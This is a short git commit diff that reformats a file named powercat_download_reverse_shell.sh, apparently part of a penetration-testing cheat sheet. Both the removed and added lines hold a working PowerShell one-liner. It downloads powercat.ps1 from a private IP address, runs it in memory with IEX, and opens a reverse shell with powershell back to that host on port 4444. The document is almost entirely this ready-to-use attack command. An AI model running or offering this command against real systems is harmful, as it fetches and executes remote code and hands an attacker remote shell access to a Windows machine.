88df214ec7e91a426202a9e36743c6cbcba13c99
Malachi Woodlee <malachi.woodlee@gmail.com>
2025-07-05 10:51:03 -0400

    Update powercat_download_reverse_shell.sh

--- Windows/powercat_download_reverse_shell.sh
+++ Windows/powercat_download_reverse_shell.sh
@@ -1,2 +1,1 @@
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.249:8000/powercat.ps1');
-powercat -c 192.168.45.249 -p 4444 -e powershell"
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.249:8000/powercat.ps1'); powercat -c 192.168.45.249 -p 4444 -e powershell"
